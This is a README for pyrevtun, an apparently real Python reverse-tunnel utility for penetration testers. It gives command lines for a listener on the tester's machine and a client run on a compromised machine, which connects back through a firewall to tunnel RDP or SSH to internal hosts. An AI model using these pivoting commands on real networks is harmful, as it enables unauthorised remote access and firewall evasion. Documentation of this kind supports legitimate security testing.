# pyrevtun

Description
===========
A pure Python reverse tunnel/reverse port forward utility (prototype) to forward TCP protocols over SSL/TLS.  This tool is designed for penetration testers and security enthusiasts.

Inspiration
===========
- Firecat: http://www.bishopfox.com/resources/tools/other-free-tools/firecat/
- Powercat: https://github.com/besimorhino/powercat/
- Socket "recvall" function: http://code.activestate.com/recipes/213239-recvall-corollary-to-socketsendall/

Requirements
============
- Python 2.7.x
- X509 PEM public/private key (unprotected)
- A password of your choice

Tool Usage
==========
1) On the penetration tester's local machine, setup pyrevtun in listener mode:

- python pyrevtun.py -m listener -l [IP:port] -t [local tunnel port] -s [certificate file] -k [private key file] -p [auth password]
- e.g. python pyrevtun.py -m listener -l 192.168.1.59:443 -t 33389 -s example_cert.pem -k example_key.pem -p pass

2) On compromised machine, setup pyrevtun in client mode:

- python pyrevtun.py -m client -l [listener IP:port] -c [target IP:port] -p [auth password]
- e.g. python pyrevtun.py -m client -l 192.168.102.59:443 -c 10.5.5.5:3389 -p pass
- This connection will open up the chosen local port on the pen test machine.

3) Using TCP app (i.e. RDP, SSH client), connect to specified local port as [localhost:local tunnel port] 
- e.g. localhost:33389

*To prevent lockup, run in the background (&)

A practical Scenario
====================

1] [Pen Test Machine] <----rev conn---- [Firewall] <------- [Compromised Machine]    ?    [Destination Machine]

- In this example, the penetration tester has compromised an internal network machine and has initiated a reverse connection (client mode) with pyrevtun back the the attack machine (listening mode).  The local port opens on the attack machine.

2) [Pen Test Machine] ----tunnel conn----> [Firewall] -------> [Compromised Machine] --------> [Destination Machine]

- The penetration tester connects to the the local port on the pen test machine (e.g. RDP).  RDP is forwarded over the reverse connection to the destination machine through the firewall and compromised machine.

Bugs/Issues
===========
- Socket shutdown/closure is not always graceful (may need to kill the process manually).
- Protocols like RDP (NLA auth) can be finicky.  If it doesn't work the first time, try it again.

Tool Usage & Ethics
===================
This tool was designed to help security professionals perform ethical and legal vulnerability assessments and penetration tests.  Do not use for nefarious purposes.

Also, I "program" for functionality, not necessarily final completion.  I am striving the for latter a little more each day...so if you find any major problems, let me know.
